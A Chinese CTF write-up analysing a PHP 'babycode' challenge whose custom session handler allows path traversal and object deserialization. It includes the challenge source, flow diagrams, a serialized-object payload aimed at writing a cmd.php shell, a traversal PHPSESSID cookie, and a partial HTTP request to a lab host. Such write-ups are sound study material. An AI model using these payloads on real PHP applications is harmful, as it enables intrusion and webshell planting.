class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;朝拜圣地 = <span class="string">&#x27;storage&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;朝拜圣地))&#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;朝拜圣地);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;禁地 = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;htaccess&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 Cookie 里是否有黑名单</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 挖掘(<span class="params">$货物, $食物</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;挖掘&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;禁地 <span class="keyword">as</span> $元素) &#123;</span><br><span class="line">            <span class="keyword">if</span>(stripos(@$_COOKIE[$食物], $元素) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;invaild &#x27;</span> . $食物);<span class="comment">// PHPSESSID</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;圣殿 = session_id();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#&#x27;/proc/self/cwd/&#x27;.  &#x27;/var/www/html/babycode/&#x27;.</span></span><br><span class="line">    <span class="comment">// 写文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 种植(<span class="params">$货物,$食物</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;种植&#x27;</span>.PHP_EOL.<span class="string">&quot;<span class="subst">$this</span>-&gt;贡品&quot;</span>.$食物;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;贡品 = $货物;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents(<span class="string">&#x27;/var/www/html/babycode/&#x27;</span>.<span class="keyword">$this</span>-&gt;朝拜圣地.<span class="string">&#x27;/sess_&#x27;</span>.$货物,$食物);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 收获(<span class="params">$货物</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;收获&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;贡品=$货物;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">string</span>)@file_get_contents(<span class="string">&#x27;/var/www/html/babycode/&#x27;</span>.<span class="keyword">$this</span>-&gt;朝拜圣地.<span class="string">&#x27;/sess_&#x27;</span>.$货物);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 总结(<span class="params">$货物</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;总结&#x27;</span>.PHP_EOL.<span class="string">&quot;<span class="subst">$this</span>-&gt;货物&quot;</span>;</span><br><span class="line">        <span class="keyword">global</span>$实物长度,$虚无缥缈;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;圣殿) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents(<span class="string">&#x27;&#x27;</span>.<span class="keyword">$this</span>-&gt;朝拜圣地.<span class="string">&#x27;/note_&#x27;</span>.<span class="keyword">$this</span>-&gt;圣殿,$货物)===$虚无缥缈?$虚无缥缈:<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 归纳(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;归纳&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">string</span>)@file_get_contents(<span class="string">&#x27;/var/www/html/babycode/&#x27;</span>.<span class="keyword">$this</span>-&gt;朝拜圣地.<span class="string">&#x27;/note_&#x27;</span>.<span class="keyword">$this</span>-&gt;贡品);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 思考(<span class="params">$货物</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;思考&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;贡品=$货物;</span><br><span class="line">         <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;朝拜圣地.<span class="string">&#x27;/sess_&#x27;</span>.$货物)) &#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;朝拜圣地.<span class="string">&#x27;/sess_&#x27;</span>.$货物);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 反省(<span class="params">$货物</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;反省&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">foreach</span>(glob(<span class="keyword">$this</span>-&gt;朝拜圣地.<span class="string">&#x27;/*&#x27;</span>) <span class="keyword">as</span> $元素) &#123;</span><br><span class="line">            <span class="keyword">if</span>(filemtime($元素) + $货物 &lt; time() &amp;&amp; file_exists($元素)) &#123;</span><br><span class="line">                unlink($元素);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 完毕(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;完毕&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destruct&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;总结(<span class="keyword">$this</span>-&gt;归纳());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$齿轮=<span class="keyword">new</span> 造齿轮();</span><br><span class="line">session_set_save_handler(<span class="keyword">array</span>($齿轮, <span class="string">&#x27;挖掘&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;完毕&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;收获&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;种植&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;反省&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;完毕&#x27;</span>));</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">srand(mktime(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">$盛世=<span class="keyword">array</span>(rand()=&gt;<span class="keyword">array</span>(<span class="string">&#x27;alice&#x27;</span>,<span class="number">0b1</span>),rand()=&gt;<span class="keyword">array</span>(<span class="string">&#x27;bob&#x27;</span>,<span class="number">0b101</span>),rand()=&gt;<span class="keyword">array</span>(<span class="string">&#x27;cat&#x27;</span>,<span class="number">0b10100</span>),rand()=&gt;<span class="keyword">array</span>(<span class="string">&#x27;dog&#x27;</span>,<span class="number">0b1111</span>),rand()=&gt;<span class="keyword">array</span>(<span class="string">&#x27;evil&#x27;</span>,<span class="number">0b101</span>),rand()=&gt;<span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="number">0b10011100001111</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> 化缘(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $_SESSION[<span class="string">&#x27;  &#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 取经(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span>$盛世;</span><br><span class="line">    $宝藏=<span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($_SESSION[<span class="string">&#x27;items&#x27;</span>] <span class="keyword">as</span> $元素)&#123;</span><br><span class="line">        $宝藏 .= $盛世[$元素][<span class="number">0</span>].<span class="string">&#x27;, &#x27;</span>;<span class="comment">//$宝藏 &lt;= items</span></span><br><span class="line">    &#125;</span><br><span class="line">    $宝藏.=<span class="string">&#x27;]&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $宝藏;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 念经(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $齿轮;</span><br><span class="line">    <span class="keyword">return</span> $齿轮-&gt;归纳();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 造世(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $盛世;</span><br><span class="line">    $宝藏=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($盛世 <span class="keyword">as</span> $按键=&gt;$元素)&#123;</span><br><span class="line">        $宝藏 .=</span><br><span class="line">        <span class="string">&#x27;&lt;div class=&quot;item&quot;&gt;&lt;form method=&quot;POST&quot;&gt;&lt;div class=&quot;form-group&quot;&gt;&#x27;</span>.</span><br><span class="line">            $元素[<span class="number">0</span>].</span><br><span class="line">        <span class="string">&#x27;&lt;/div&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&quot;&#x27;</span>.</span><br><span class="line">            $按键.</span><br><span class="line">        <span class="string">&#x27;&quot;&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt;buy ($&#x27;</span>.$元素[<span class="number">1</span>].<span class="string">&#x27;)&lt;/button&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $宝藏;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> $_POST,$_SESSION,$_COOKIE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;balance&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;balance&#x27;</span>] = <span class="number">0b1000101110010</span>/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;items&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;items&#x27;</span>] = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;note&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;note&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;balance&#x27;</span>] &gt;= $盛世[$_POST[<span class="string">&#x27;id&#x27;</span>]][<span class="number">1</span>]) &#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;balance&#x27;</span>] = $_SESSION[<span class="string">&#x27;balance&#x27;</span>]-$盛世[$_POST[<span class="string">&#x27;id&#x27;</span>]][<span class="number">1</span>];</span><br><span class="line">        array_push($_SESSION[<span class="string">&#x27;items&#x27;</span>], $_POST[<span class="string">&#x27;id&#x27;</span>]);<span class="comment">//items &lt;= id</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;span style=&quot;color:green&quot;&gt;buy succ!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;lack of balance!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_POST[<span class="string">&#x27;note&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;note&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_POST[<span class="string">&#x27;note&#x27;</span>])&lt;=<span class="number">1</span>&lt;&lt;<span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fuck&quot;</span>;</span><br><span class="line">        $齿轮-&gt;总结(str_replace(<span class="keyword">array</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;&amp;amp;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="string">&#x27;&quot;&amp;gt;&#x27;</span>), $_POST[<span class="string">&#x27;note&#x27;</span>]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;span style=&quot;color:green&quot;&gt;write succ!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;note too long!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>session_set_save_handler</li>
</ul>
<blockquote>
<p>session handler默认启动顺序是session_start分别调用的回调函数。为open read ，然后等待脚本结束，收集<code>$_SESSION</code>(默认在内存中)，然后关闭脚本，然后执行write，写入文件，然后close。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_set_save_handler(<span class="string">&quot;sess_open&quot;</span>, <span class="string">&quot;sess_close&quot;</span>, <span class="string">&quot;sess_read&quot;</span>, <span class="string">&quot;sess_write&quot;</span>, <span class="string">&quot;sess_destroy&quot;</span>, <span class="string">&quot;sess_gc&quot;</span>); session_set_save_handler(<span class="keyword">array</span>($齿轮,<span class="string">&#x27;挖掘&#x27;</span>),<span class="keyword">array</span>($齿轮,<span class="string">&#x27;完毕&#x27;</span>),<span class="keyword">array</span>($齿轮,<span class="string">&#x27;收获&#x27;</span>),<span class="keyword">array</span>($齿轮,<span class="string">&#x27;种植&#x27;</span>),<span class="keyword">array</span>($齿轮,<span class="string">&#x27;反省&#x27;</span>),<span class="keyword">array</span>($齿轮,<span class="string">&#x27;完毕&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>从代码脚本分析流程来看,分为两种情况</p>
<ul>
<li><p><code>post note =NULL </code>为<code>__construct</code>、 <code>挖掘</code>、<code>收获</code>、<code>脚本执行</code>、<code> __destruct</code>、<code>归纳</code> 、<code>总结</code> 、 <code>种植</code>、<code>完毕</code></p>
</li>
<li><p><code>post note =NULL</code>为<code>__construct</code>、 <code>挖掘</code>、<code>收获</code>、<code>脚本执行</code>、<code>总结</code>、  <code> __destruct</code>、<code>归纳</code> 、<code>总结</code> 、 <code>种植</code>、<code>完毕</code></p>
</li>
</ul>
<h4 id="执行代码中坑"><a href="#执行代码中坑" class="headerlink" title="执行代码中坑:"></a>执行代码中坑:</h4><p>如果你在使用解析后的代码时,遇到 <code>file_get_content</code>和<code>file_put_content</code>报错问题,且note可以生成并写入，即输入note后脚本执行加总结可以执行(尝试过程中发现php7.0版本都有这个问题),但之后的<code>归纳</code> 、<code>总结</code> 、 <code>种植</code>无法执行,可以将路径换成<code>/proc/self/cwd/</code>就可以正常执行。</p>
<blockquote>
<p>题外话: 这个坑踩了一个下午,一直以为是配置问题,后来想到之前考到的一题中讲到<code>include_once</code>与<code>/x/../proc/self/cwd</code>搭配可以再读一次代码(之前已经包含代码了),于是猜测<code>session_set_save_handler</code> 解析出了问题</p>
</blockquote>
<h4 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h4><p>解题的思路,主要利用原有函数的读写操作和session导致的反序列化(主要是造齿轮类的反序列化),后一部分的原来,可以看这篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640">session serialize</a></p>
<p>先以正常的读写过程为例</p>
<ul>
<li>无<code>post_note</code>情况下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">st&#x3D;&gt;start: __contruct</span><br><span class="line">op1&#x3D;&gt;operation: 挖掘,检查PHPSESSID是否在黑名单</span><br><span class="line">op2&#x3D;&gt;operation: 收获,read(storage&#x2F;sess_PHPSESSID),贡品&#x3D;货物</span><br><span class="line">op3&#x3D;&gt;operation: __destruct</span><br><span class="line">op4&#x3D;&gt;operation: 归纳,read(storage&#x2F;note_PHPSESSID)</span><br><span class="line">op5&#x3D;&gt;operation: 总结,write(storage&#x2F;note_PHPSESSID，归纳),当PHPSESSID为空时,return NULL</span><br><span class="line">op6&#x3D;&gt;operation: 种植,write(storage&#x2F;sess_PHPSESSID,session_serialize)</span><br><span class="line">e&#x3D;&gt;end: 完毕</span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;op4-&gt;op5-&gt;op6-&gt;e</span><br></pre></td></tr></table></figure>

<ul>
<li>有<code>post_note</code>情况下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">st&#x3D;&gt;start: __contruct</span><br><span class="line">op1&#x3D;&gt;operation: 挖掘,检查PHPSESSID是否在黑名单</span><br><span class="line">op2&#x3D;&gt;operation: 收获,read(storage&#x2F;sess_PHPSESSID),贡品&#x3D;货物</span><br><span class="line">op7&#x3D;&gt;operation: 总结,write(storage&#x2F;note_PHPSESSID,post_note)</span><br><span class="line">op3&#x3D;&gt;operation: __destruct</span><br><span class="line">op4&#x3D;&gt;operation: 归纳,read(storage&#x2F;note_PHPSESSID)</span><br><span class="line">op5&#x3D;&gt;operation: 总结,write(storage&#x2F;note_PHPSESSID，归纳),当PHPSESSID为空时,return NULL</span><br><span class="line">op6&#x3D;&gt;operation: 种植,write(storage&#x2F;sess_PHPSESSID,session_serialize)</span><br><span class="line">e&#x3D;&gt;end: 完毕</span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op7-&gt;op3-&gt;op4-&gt;op5-&gt;op6-&gt;e</span><br></pre></td></tr></table></figure>



<ul>
<li>有<code>post_id</code>情况下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">st&#x3D;&gt;start: __contruct</span><br><span class="line">op1&#x3D;&gt;operation: 挖掘,检查PHPSESSID是否在黑名单</span><br><span class="line">op2&#x3D;&gt;operation: 收获,read(storage&#x2F;sess_PHPSESSID),贡品&#x3D;货物</span><br><span class="line">op7&#x3D;&gt;operation: 脚本 array_push($_SESSION[&#39;items&#39;], $_POST[&#39;id&#39;])</span><br><span class="line">op3&#x3D;&gt;operation: __destruct</span><br><span class="line">op4&#x3D;&gt;operation: 归纳,read(storage&#x2F;note_PHPSESSID)</span><br><span class="line">op5&#x3D;&gt;operation: 总结,write(storage&#x2F;note_PHPSESSID，归纳),当PHPSESSID为空时,return NULL</span><br><span class="line">op6&#x3D;&gt;operation: 种植,write(storage&#x2F;sess_PHPSESSID,session_serialize)</span><br><span class="line">e&#x3D;&gt;end: 完毕</span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op7-&gt;op3-&gt;op4-&gt;op5-&gt;op6-&gt;e</span><br></pre></td></tr></table></figure>

<p>漏洞产生:</p>
<p>当<code>file_get_contents</code>和<code>file_put_contents</code>会对<code>/right_path/../path_name</code>、<code>/error_path/../path_name</code>会产生不同的操作</p>
<ul>
<li><code>/right_path/../path_name</code> 不会执行</li>
<li><code>/error_path/../path_name</code> 会执行</li>
</ul>
<blockquote>
<p>即 write(storage/note_fe1w0/../sess_xz)成功</p>
</blockquote>
<p>这样我们就可以利用收获函数的session读取,导致造齿轮类反序列化.</p>
<p>具体payload 可以看<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216289#h3-6">https://www.anquanke.com/post/id/216289#h3-6</a>,</p>
<p>因为我在复现过程,发现疑惑且无法解答</p>
<p>先放出齿轮类反序列化流程图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">st&#x3D;&gt;start: __contruct</span><br><span class="line">op1&#x3D;&gt;operation: 挖掘,检查PHPSESSID是否在黑名单</span><br><span class="line">op2&#x3D;&gt;operation: 收获,read(storage&#x2F;sess_PHPSESSID),贡品&#x3D;货物</span><br><span class="line">op7&#x3D;&gt;operation: 脚本 array_push($_SESSION[&#39;items&#39;], $_POST[&#39;id&#39;])</span><br><span class="line">op3&#x3D;&gt;operation: __destruct</span><br><span class="line">op4&#x3D;&gt;operation: 归纳,read(storage&#x2F;note_PHPSESSID)</span><br><span class="line">op5&#x3D;&gt;operation: 总结,write(storage&#x2F;note_PHPSESSID，归纳),当PHPSESSID为空时,return NULL</span><br><span class="line">op8&#x3D;&gt;operation: __destruct + 反序列化</span><br><span class="line">op4&#x3D;&gt;operation: 归纳,read(storage&#x2F;$this-&gt;贡品)</span><br><span class="line">op5&#x3D;&gt;operation: 总结,write(storage&#x2F;$this-&gt;贡品，归纳),当PHPSESSID为空时,return NULL</span><br><span class="line">op6&#x3D;&gt;operation: 种植,write(storage&#x2F;sess_PHPSESSID,session_serialize)</span><br><span class="line">e&#x3D;&gt;end: 完毕</span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op7-&gt;op3-&gt;op4-&gt;op5-&gt;op8-&gt;op4-&gt;op5-&gt;op6-&gt;e</span><br></pre></td></tr></table></figure>



<p>可以对比无<code>post_note</code>情况下流程图,可以发现要生成<code>node_cmd.php</code>的前提条件为<code>file_put_contents(/error_path)</code>or<code>file_put_contents(new_file)</code>可以执行,否则将无法谢shell</p>
<p>但回顾到一开始的状态,即无<code>post_note</code>情况下流程图,会发现若<code>file_put_contents(/error_path)</code>or<code>file_put_contents(new_file)</code>可以执行,这样的话,在<code>get</code>方式请求时,都会生成两个文件。</p>
<p>更坑的是,当你到第二步,想利用<code>/error_path/../sess_name</code> 执行时,会导致sess_name会被写两次,导致无法实际控制</p>
<p>以下是我在假设环境符合题意下的payload 学习,若以上想法有什么问题,还请师傅们斧正.👍</p>
<p>当然由于path可控,那就可以直接尝试读取flag</p>
<ul>
<li>反序列化</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 造齿轮 </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> $朝拜圣地 = <span class="string">&#x27;storage&#x27;</span>;</span><br><span class="line"> <span class="keyword">protected</span> $贡品 = <span class="string">&#x27;xz/../sess_xz&#x27;</span>;</span><br><span class="line"> <span class="keyword">protected</span> $圣殿 = <span class="string">&#x27;cmd.php&#x27;</span>;</span><br><span class="line"> <span class="keyword">protected</span> $禁地 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">&#x27;session.save_path&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> 造齿轮();</span><br><span class="line"><span class="comment">//urlencode  a%7CO%3A9%3A%22%E9%80%A0%E9%BD%BF%E8%BD%AE%22%3A4%3A%7Bs%3A15%3A%22%00%2A%00%E6%9C%9D%E6%8B%9C%E5%9C%A3%E5%9C%B0%22%3Bs%3A7%3A%22storage%22%3Bs%3A9%3A%22%00%2A%00%E8%B4%A1%E5%93%81%22%3Bs%3A13%3A%22xz%2F..%2Fsess_xz%22%3Bs%3A9%3A%22%00%2A%00%E5%9C%A3%E6%AE%BF%22%3Bs%3A7%3A%22cmd.php%22%3Bs%3A9%3A%22%00%2A%00%E7%A6%81%E5%9C%B0%22%3Bs%3A0%3A%22%22%3B%7D</span></span><br></pre></td></tr></table></figure>

<ul>
<li>先将 序列化文本存储在<code>sess_xzas</code>文件中</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=xz/../sess_xzas</span><br><span class="line"></span><br><span class="line">note=a%7CO%3A9%3A%22%E9%80%A0%E9%BD%BF%E8%BD%AE%22%3A4%3A%7Bs%3A15%3A%22%00%2A%00%E6%9C%9D%E6%8B%9C%E5%9C%A3%E5%9C%B0%22%3Bs%3A7%3A%22storage%22%3Bs%3A9%3A%22%00%2A%00%E8%B4%A1%E5%93%81%22%3Bs%3A13%3A%22xz%2F..%2Fsess_xz%22%3Bs%3A9%3A%22%00%2A%00%E5%9C%A3%E6%AE%BF%22%3Bs%3A7%3A%22cmd.php%22%3Bs%3A9%3A%22%00%2A%00%E7%A6%81%E5%9C%B0%22%3Bs%3A0%3A%22%22%3B%7D</span><br></pre></td></tr></table></figure>

<p><img src="http://img.xzaslxr.xyz/img/image-20200914001035019.png" alt="image-20200914001035019"></p>
<ul>
<li>将payload导入到<code>sess_xz</code>中,</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/babycode/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.21.136</span><br><span class="line"><span class="attribute">Proxy-Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.21.136</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36 Edg/87.0.634.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.21.136/babycode/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: 